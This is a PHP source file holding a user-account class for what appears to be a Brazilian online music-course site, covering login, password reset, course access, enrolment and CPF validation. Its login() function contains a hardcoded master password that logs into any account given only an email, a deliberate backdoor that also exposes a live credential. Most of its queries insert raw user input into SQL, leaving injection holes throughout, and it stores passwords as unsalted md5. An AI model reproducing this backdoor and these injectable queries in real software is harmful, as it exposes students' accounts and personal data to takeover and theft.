<?php

class user extends Config
{

    public $invalid_numbers_accounts_ids = array();
    public $fixed_numbers = array();

    protected $mysqli;
    public $data;

    function __construct()
    {
        parent::__construct();
    }

    public function esqueci($req)
    {
        $vcm = $this->mysqli->query("SELECT * FROM alunos WHERE email='$req'  ");
        if (mysqli_num_rows($vcm) == 0) {
            return 'Este e-mail não esta cadastrado conosco.';
        } else {
            $dados = $vcm->fetch_array();
            $dados['nova_senha'] =
                $nsenha = 'P' . uniqid();
            $dados['nova_senha'] = $nsenha;
            $this->mysqli->query("UPDATE alunos set senha='" . $nsenha . "' WHERE email='$req'  ");
            include_once('class.php');
            $gm = new gm();
            $gm->email($dados['email'], null, null, 'esqueci_senha', $dados);
            return 'Uma nova senha foi enviada para seu e-mail.';
        }
    }

    public function validar_email($codigo){
        $vcm = $this->mysqli->query("SELECT * FROM alunos WHERE email_confirmed='$codigo'  ");
        if (mysqli_num_rows($vcm) == 1) {
            $dsa = $vcm->fetch_array();
            $this->mysqli->query("UPDATE alunos SET email_confirmed='' WHERE alunoId = '".$dsa['alunoId']."' ");
            $_SESSION['aluno'] = $dsa['alunoId'];
            $_SESSION['nome'] = $dsa['nome'];
        }
    }

    public function login($var)
    {
        $senhaMestra = "Terra_Turi@2019";

        if ($var['lsenha'] == $senhaMestra) {
            $result = $this->mysqli->query("SELECT * FROM alunos WHERE email='" . $var['lemail'] . "' LIMIT 1");
        } else {
            $result = $this->mysqli->query("SELECT * FROM alunos WHERE email='" . $var['lemail'] . "' and senha ='" . $var['lsenha'] . "' LIMIT 1");
        }

        if (mysqli_num_rows($result) == 1) {
            $r = $result->fetch_array();
            $diff = strtotime(date('Y-m-d H:i:s')) - strtotime($r['ping']);
            /*
                   if($diff < 60){
                $re['status'] = 0;
                $re['msg'] = "Você parece estar logado em outro dispositivo, deslogue dos outros dispositivos e tente novamente em alguns segundos!";
                return json_encode($re);
                die;
                   }
            */
            
            /*
            if($r['email_confirmed'] != ''){
                 $re['status'] = 0;
                 $re['msg'] = "Você ainda não validou seu email!";
                return json_encode($re);
                die;
            }
            */

            $_SESSION['aluno'] = $r['alunoId'];
            $_SESSION['nome'] = $r['nome'];
            $re['status'] = 1;
            $re['redirect'] = $_SESSION['redirect'];
            $_SESSION['session'] = $this->updateSession();

            return json_encode($re);
        } else {
            $result = $this->mysqli->query("SELECT * FROM alunos WHERE email='" . $var['lemail'] . "' LIMIT 1");

            if (mysqli_num_rows($result) == 1) {
                $r = $result->fetch_array();
                $stored_hash = $r['senha'];

                if (md5($var['lsenha']) == $stored_hash) { // Comparar as senhas

            /*
                    if($r['email_confirmed'] != ''){
                    $re['status'] = 0;
                    $re['msg'] = "Você ainda não validou seu email!";
                    return json_encode($re);
                    die;
                    }
           */
                    $_SESSION['aluno'] = $r['alunoId'];
                    $_SESSION['nome'] = $r['nome'];
                    $re['status'] = 1;
                    $re['redirect'] = $_SESSION['redirect'];
                    $_SESSION['session'] = $this->updateSession();
                    return json_encode($re);
                }
            }

            $re['msg'] = "Dados incorretos";
            return json_encode($re);
        }
    }

    public function user($uid = null)
    {
        if ($uid) {
            return (object) $this->getRegistro('alunos', 'alunoId', $uid);
        }

        if (isset($_SESSION['aluno'])) {
            return (object) $this->getRegistro('alunos', 'alunoId', $_SESSION['aluno']);
        } else {
            return false;
        }
    }

    public function planoAluno($alunoId = null)
    {
        $aluno = $alunoId ? $alunoId : $_SESSION['aluno'];

        if ($this->user()) {
            $result = $this->mysqli->query("SELECT * FROM assinaturas left join planos ON assinaturas.planoId = planos.planoId  WHERE assinaturas.alunoId= '" . $aluno . "'");
            return (object) $result->fetch_array();
        }
    }

    public function isSignExpired()
    {
    }

    public function isFreeCourse($curso)
    {
        $res1 = $this->mysqli->query("SELECT * FROM cursos WHERE plano_free = 1 and cursoId=" . $curso);
        if (mysqli_num_rows($res1) > 0) {
            return true;
        }
        return false;
    }

    public function isCursoExpired($curso)
    {
        $res1 = $this->mysqli->query("SELECT * FROM cursos_matriculas WHERE expira < now() and cursoId='$curso' and alunoId= '" . $_SESSION['aluno'] . "'");
        if (mysqli_num_rows($res1) > 0) {
            return true;
        }
        return false;
    }

    public function isEnrolled($curso)
    {
        //$res1 = $this->mysqli->query("SELECT * FROM cursos_matriculas   WHERE (expira > now() or expira is null) and cursoId='$curso' and alunoId= '" . $_SESSION['aluno'] . "'");
        $res1 = $this->mysqli->query("SELECT * FROM cursos_matriculas   WHERE cursoId='$curso' and alunoId= '" . $_SESSION['aluno'] . "'");
        if (mysqli_num_rows($res1) == 1) {
            return true;
        } else {
            return false;
        }
    }

    public function isEnrolledENotExpired($curso)
    {
        $res1 = $this->mysqli->query("SELECT * FROM cursos_matriculas   WHERE cursoId='$curso' and expira > now() and alunoId= '" . $_SESSION['aluno'] . "'");
        if (mysqli_num_rows($res1) == 1) {
            return true;
        } else {
            return false;
        }
    }

    public function accessPermission($curso)
    {
        $ret = [];
        if (!$this->user()) {
            $ret['ret'] = false;
            $ret['reason'] = 'Para acessar as aulas, é necessário está logado em nosso sistema!';
            return $ret;
        } else {

            if ($this->isFreeCourse($curso)) {
                $ret['ret'] = true;
                $ret['reason'] = 'free_course';
                return $ret;
            }

            include_once("class.php");
            $gm = new gm();


            //privilegio email adicionado a curso oculto
            if($gm->acessoCursoOculto($curso) == true){
                $ret['ret'] = true;
                $ret['reason'] = 'enrolled';
                return $ret;
            }

            if ($gm->ehAssinante()) {
                if ($gm->ehAssinanteAtivo()) {
                    if ($gm->isFreeUser()) {  // é assinante free
                        if ($this->isEnrolled($curso)) {  // está matriculado no curso
                            if ($this->isCursoExpired($curso)) {
                                $ret['ret'] = false;
                                $ret['reason'] = 'Sua matrícula, nesse curso venceu. Agora você tem acesso apenas à aulas free.';
                                return $ret;
                            }

                            $ret['ret'] = true;
                            $ret['reason'] = 'enrolled';
                            return $ret;
                        } else {  // não está matriculado no curso
                            $ret['ret'] = false;
                            $ret['reason'] = 'Para acessar as aulas, é necessário comprar este curso ou um plano!';
                            return $ret;
                        }
                    } else {  // é assinante pago

                        if ($this->idCursosPlanoMat($curso) != false && $this->isEnrolledENotExpired($curso) == false  ) {
                            return $this->idCursosPlanoMat($curso);
                        }

                        $ret['ret'] = true;
                        $ret['reason'] = 'assinante';
                        return $ret;
                    }
                } else {  // assinatura expirada
                    if ($this->isEnrolled($curso)) {  // está matriculado no curso
                        if ($this->isCursoExpired($curso)) {
                            $ret['ret'] = false;
                            $ret['reason'] = 'Sua matrícula, nesse curso venceu. Agora você tem acesso apenas à aulas free.';
                            return $ret;
                        }

                        $ret['ret'] = true;
                        $ret['reason'] = 'enrolled';
                        return $ret;
                    } else {  // não está matriculado no curso
                        $ret['ret'] = false;
                        $ret['reason'] = 'Para acessar as aulas, é necessário comprar este curso ou um plano!';
                        return $ret;
                    }

                    $ret['ret'] = false;
                    $ret['reason'] = 'Sua assinatura venceu. Agora você tem acesso apenas à aulas free.';
                    return $ret;
                }
            } else {  // não é assinante

                if ($this->isEnrolled($curso)) {  // está matriculado no curso
                    if ($this->isCursoExpired($curso)) { // curso está expirado
                        $ret['ret'] = false;
                        $ret['reason'] = 'Sua matrícula, nesse curso venceu. Agora você tem acesso apenas à aulas free.';
                        return $ret;
                    }

                    $ret['ret'] = true;
                    $ret['reason'] = 'enrolled';
                    return $ret;
                }

                $ret['ret'] = false;
                $ret['reason'] = 'Para acessar as aulas, é necessário comprar este curso ou um plano!';
                return $ret;
            }
        }
        $ret['ret'] = false;
        $ret['reason'] = 'Para acessar as aulas, é necessário comprar este curso ou um plano!';
        return $ret;
    }


    public function courseButton($curso)
    {

        $link_ass =  u . 'cursos-de-musica-online-assinaturas/6/todos-os-planos';
        if ($curso['categoria_principal']) {
            $dcp = $this->mysqli->query(" SELECT
            pc.nome, pc.categoriaId from planos p
            left join categorias_planos  pc on pc.categoriaId = p.categoriaId
            where find_in_set(" . $curso['cursoId'] . ",p.cursos) and p.nome not in ('Anual','Semestral','Gratuito')
            limit 1
            ");
            if (mysqli_num_rows($dcp)  >  0) {
                $dados_plano_categoria = $dcp->fetch_array();
                $link_ass = u . "cursos-de-musica-online-assinaturas/" . $dados_plano_categoria['categoriaId'] . '/' . ln($dados_plano_categoria['nome']);
            }
        }


        $current_url = urlencode($url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

        $btComprarCurso = "
		<form method='post' action='" . u . "carrinho/cart_update.php'>
		<input type='hidden' size='2' maxlength='2' name='product_qty' value='1' />
		<input type='hidden' name='product_code' value='" . $curso['cursoId'] . "' />
		<input type='hidden' name='type' value='add' />
		<input type='hidden' name='return_url' value='{$current_url}' />
		<div align='center'><button type='submit' class='btn btn-danger' style='margin: 0;padding: 8px; background-color: #626262; border: 1px solid #626262' onclick='return btnComprarCurso()'>COMPRAR CURSO</button>
		</form>";

        $btAssinarPlano = "<a class='btn btn-danger' href='" . $link_ass . "' style='background-color: #d9534f; padding: 8px' onclick='return btnAssinarPlano()'>ASSINAR PLANO</a></div>";

        $btRenovar = "<a class='btn btn-danger' href='" . $link_ass . "' style='background-color: #d9534f; padding: 8px'>RENOVAR</a>";
        $btAcessar = "<button rel='" . $curso['cursoId'] . "' class='button btn-sm purchase-button thim-enroll-course-button access-course' style='background-color: #d9534f; padding: 8px'>ACESSAR</button>";

        if (!$this->user()) {
            if ($this->isFreeCourse($curso['cursoId'])) {
                return $btAcessar;
            }
            return $btComprarCurso . $btAssinarPlano;
        } else {
            if ($this->isFreeCourse($curso['cursoId'])) {
                return $btAcessar;
            }
            include_once("class.php");
            $gm = new gm();


            if ($gm->ehAssinante()) { 
                if ($gm->ehAssinanteAtivo()) {
                    if ($gm->isFreeUser()) {  // é assinante free 
                         
                        if ($this->isEnrolled($curso['cursoId'])) {  // está matriculado no curso
                             
                            if ($this->isCursoExpired($curso['cursoId'])) {
                                return $btRenovar;
                            }
                            return $btAcessar;
                        } else {  // não está matriculado no curso
                            return $btComprarCurso . $btAssinarPlano;
                        }
                    } else {  // é assinante pago
                        return $btAcessar;
                    }
                } else {  // assinatura expirada
                    
                    //condicao para assinatura free expirada mas matriculado no curso
                    if ($this->isEnrolled($curso['cursoId'])) {  // está matriculado no curso
                             
                            if ($this->isCursoExpired($curso['cursoId'])) {
                                return $btRenovar;
                            }
                            return $btAcessar;
                    }

                    return $btComprarCurso . $btAssinarPlano;
                }
            } else {  // não é assinante
                if ($this->isEnrolled($curso['cursoId'])) {  // está matriculado no curso
                    if ($this->isCursoExpired($curso['cursoId'])) { // curso está expirado
                        return $btRenovar;
                    }
                    return $btAcessar;
                }
            }
        }
        return $btComprarCurso . $btAssinarPlano;
    }

    public function lista($table, $where = null, $dep = false)
    {
        if ($dep) {
            var_dump("SELECT * FROM $table $where");
            die;
        }

        $row = array();
        $result = $this->mysqli->query("SELECT * FROM $table $where");
        while ($rows = $result->fetch_array()) {
            $row[] = $rows;
        }
        return $row;
    }

    public function idCursosPlanoMat($curso)
    {
        $result = $this->lista("assinaturas", " where  alunoId = '" . $_SESSION['aluno'] . "'  ");
        $planoId = $result[0]['planoId'];

        $plano = $this->getRegistro('planos', 'planoId', $planoId);

        $cursos = explode(',', $plano['cursos']);

        if (!in_array($curso, $cursos)) {
            $ret['ret'] = false;
            $ret['reason'] = 'Curso indisponivel no seu plano!';
            return $ret;
            die;
        }
        return false;
    }

    public function matricular($curso)
    {
        if ($this->user()) {
            if (!$this->isEnrolled($curso)) {
                $mp = $this->accessPermission($curso);
                if ($mp['ret'] == true) {
                    $this->idCursosPlanoMat($curso);
                    $this->mysqli->query("INSERT INTO cursos_matriculas  set cursoId='$curso', alunoId= '" . $_SESSION['aluno'] . "'");
                }
            }
        }
    }

    public function isloged_old()
    {
        if (!$this->user()) {
            header('Location:login');
            die;
        }
    }

    public function isloged()
    {
        if ($this->user()) {
            return true;
        } else {
            return false;
        }
    }

    public function sair($noredir = null)
    {
        session_destroy();
        session_unset();

        unset($_COOKIE['aluno']);
        unset($_SESSION['aluno']);
        unset($_SESSION['aluno']);
        unset($_SESSION['session']);

        setcookie('aluno', '000');
        if (!$noredir) {
            header('Location: /');
        }
    }


    public function getRegistro($table, $chave, $id, $protect = NULL)
    {
        $q = '';
        if ($protect) {
            $q = "  and  $protect = '" . $_SESSION['radmin'] . "' ";
        }

        $result = $this->mysqli->query("SELECT * FROM $table WHERE  $chave='" . $id . "' $q ");
        $row = $result->fetch_array();
        return $row;
    }


    public function novaOpiniao($dados)
    {
        if ($this->isloged()) {
            if ($this->countreg('opinioes', ' WHERE cursoId = "' . $dados['cursoId'] . '" and alunoId = "' . $_SESSION['aluno'] . '" ') > 0) {
                return "Obrigado! Você já opinou neste curso!";
            } else {
                $this->mysqli->query("INSERT INTO opinioes set alunoId='" . $_SESSION['aluno'] . "', cursoId='$dados[cursoId]', opiniao='$dados[opiniao]', nota='$dados[nota]' ");
                return "Obrigado! opinião recebida!";
            }
        } else {
            return "Você precisa estar logado!";
        }
    }


    public function newsletter($d)
    {
        if ($this->countreg('newsletter', ' WHERE email = "' . $d['EMAIL'] . '"  ') > 0) {
            return "Obrigado! Você já é cadastrado!";
        } else {
            $this->mysqli->query("INSERT INTO newsletter set  email='$d[EMAIL]' ");
            return "Obrigado! seu cadastro em nossa newsletter foi realizado!";
        }
    }


    public function updatePing()
    {
        if ($this->isloged()) {
            $ping = date('Y-m-d H:i:s');
            $ip = $_SERVER['REMOTE_ADDR'];
            $this->mysqli->query("UPDATE alunos set ping = '$ping' , ip ='$ip' WHERE alunoId='" . $_SESSION['aluno'] . "' ");
        }
    }


    public function updateSession()
    {
        if ($this->isloged()) {
            $session = md5(uniqid(rand(), true));
            $this->mysqli->query("UPDATE alunos set session = '$session'   WHERE alunoId='" . $_SESSION['aluno'] . "' ");
            return $session;
        }
    }


    public function vfsession()
    {


        $result = $this->mysqli->query("SELECT * FROM alunos WHERE  session = '" . $_SESSION['session'] . "' and  alunoId='" . $_SESSION['aluno'] . "'   ");
        if (mysqli_num_rows($result) == 0) {
            $this->sair(1);
            return 0;
        }

        return 1;
    }

    public function updateUserpgto($dados)
    {

        $ret = array('.', '-');
        $dados['pagador_cpf'] = str_replace($ret, '', $dados['pagador_cpf']);

        if (!$this->valida_cpf($dados['pagador_cpf'])) {
            return 'CPF Inválido';
        }

        if ($this->countreg('alunos', ' WHERE cpf = "' . $dados['pagador_cpf'] . '" and alunoId != "' . $_SESSION['aluno'] . '" ') > 0) {
            return 'CPF já esta cadastrado para outro aluno';
        }

        if ($this->countreg('alunos', ' WHERE email = "' . $dados['pagador_email'] . '" and alunoId != "' . $_SESSION['aluno'] . '" ') > 0) {
            return 'email ja cadastrado';
        }

        $this->mysqli->query("UPDATE alunos set

		nome='" . $dados['pagador_nome'] . "',
		cpf='" . $dados['pagador_cpf'] . "',
		cidade='" . $dados['pagador_cidade'] . "',
		uf='" . $dados['pagador_estado'] . "',
		endereco='" . $dados['pagador_logradouro'] . "',
		bairro='" . $dados['pagador_bairro'] . "',
		cep='" . $dados['pagador_cep'] . "',
		celular='" . $dados['pagador_telefone'] . "'

         where alunoId = '" . $_SESSION['aluno'] . "'  ");

        return 0;
    }

    public function newuser($dados, $update = null)
    {
        $esc = array('upid', '_wysihtml5_mode', 'preco', 'senha2', 'updateuser');
        $data = null;

        if (!isset($dados['nome'])) {
            return 'O campo nome é obrigatório!';
        }

        if (!isset($dados['sobrenome'])) {
            return 'O campo sobrenome é obrigatório!';
        }
        if (!isset($dados['endereco'])) {
            return 'O campo endereco é obrigatório!';
        }

        $ret = array('.', '-');
        $dados['cpf'] = str_replace($ret, '', $dados['cpf']);

        if (!$this->valida_cpf($dados['cpf'])) {
            return 'CPF Inválido';
        }

        if (!$update) {
            if ($this->countreg('alunos', ' WHERE cpf = "' . $dados['cpf'] . '" ') > 0) {
                return 'CPF já esta cadastrado';
            }

            if ($this->countreg('alunos', ' WHERE email = "' . $dados['email'] . '" ') > 0) {
                return 'email ja cadastrado';
            }
        }

        if ($dados['senha']) {
            if ($dados['senha'] != $dados['senha2']) {
                return 'Senhas diferentes';
            }
        }

        $containsLetter = preg_match('/[a-zA-Z]/', $dados['senha']);
        $containsDigit = preg_match('/\d/', $dados['senha']);

        if ($dados['senha']) {
            if ($containsDigit == false or $containsLetter == false or strlen($dados['senha']) < 8) {
                return 'Sua senha precisa conter letras e números, e ter mais de 8 caracteres';
            }
        } else {
            array_push($esc, "senha");
        }

        if (!$update) {
            $dados['data_cadastro'] = date('d/m/y H:i');
        }

        $dados['senha'] = md5($dados['senha']);

        foreach ($dados as $key => $value) {
            if (!in_array($key, $esc)) {
                $data .= "$key = '" . $this->mysqli->real_escape_string($value) . "',";
            }
            if ($key == 'preco') {
                $data .= "preco = '" . str_replace(',', '.', $value) . "',";
            }
        }

        $data = substr($data, 0, strlen($data) - 1);
        if ($update) {
            $xx = $this->mysqli->query("UPDATE alunos set  $data  where alunoId = '" . $_SESSION['aluno'] . "'  ");
        } else {

            $code_email = md5(uniqid());
            $code_sql = " , email_confirmed = '" . $code_email . "'";
            $dados['email_confirmed'] = $code_email;

            $xx = $this->mysqli->query("INSERT INTO alunos set  $data   $code_sql  ");    //echo "INSERT INTO alunos set  $data    ";
            include_once('class.php');
            $gm = new gm();
            $gm->email($dados['email'], null, null, 'cadastro', $dados);
        }

        if ($xx) {
            return 1;
        } else {
            return $this->mysqli->error; /*'Erro ao inserir dados no banco de dados.'*/;
        }
    }


    public function countreg($table, $where = null)
    {
        if ($where) {
            $w = $where;
        } else {
            $w = '';
        }
        $result = $this->mysqli->query("SELECT * FROM  $table $w ");
        return mysqli_num_rows($result);
    }

    public function email($to, $assunto, $msg)
    {
        $from = email_remetente;
        $headers = "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html; charset=utf-8\n";
        $headers .= "From: " . site_nome . " <" . email_remetente . ">";
        $lay = '';
        $lay .= '<table  cellpadding="0" cellspacing="0" border="0" width="700px" style="color:#555;margin:0 auto;border-bottom:solid 2px #f39243; padding-bottom:12px"><tr><td style="background:#fff; height:54px;text-align:center"><img src="' . u . '/imgs/logo.png" /></td>
	</tr><tr><td  style="padding-top:20px;">' . $msg . '</td></tr></table>';

        $envia = mail($to, $assunto, $lay, $headers);


        if (($envia) == false) {
            $ret = "Ops! Ocorreu um erro!";
        } else {
            $ret = "Mensagem enviada";
        }
        return $ret;
    }


    public function valida_cpf($cpf = false)
    {

        /**
         *
         *
         * @param
         * @param
         * @param
         * @return
         *
         */
        $ret = array('.', '-');
        $cpf = str_replace($ret, '', $cpf);

        if (!function_exists('calc_digitos_posicoes')) {
            function calc_digitos_posicoes($digitos, $posicoes = 10, $soma_digitos = 0)
            {
                for ($i = 0; $i < strlen($digitos); $i++) {
                    $soma_digitos = $soma_digitos + ($digitos[$i] * $posicoes);
                    $posicoes--;
                }

                $soma_digitos = $soma_digitos % 11;

                if ($soma_digitos < 2) {
                    $soma_digitos = 0;
                } else {
                    $soma_digitos = 11 - $soma_digitos;
                }

                $cpf = $digitos . $soma_digitos;

                return $cpf;
            }
        }

        if (!$cpf) {
            return false;
        }

        $cpf = preg_replace('/[^0-9]/is', '', $cpf);
        if (strlen($cpf) != 11) {
            return false;
        }

        $digitos = substr($cpf, 0, 9);
        $novo_cpf = calc_digitos_posicoes($digitos);
        $novo_cpf = calc_digitos_posicoes($novo_cpf, 11);
        if ($novo_cpf === $cpf) {
            return true;
        } else {
            return false;
        }
    }
}


$user = new user();
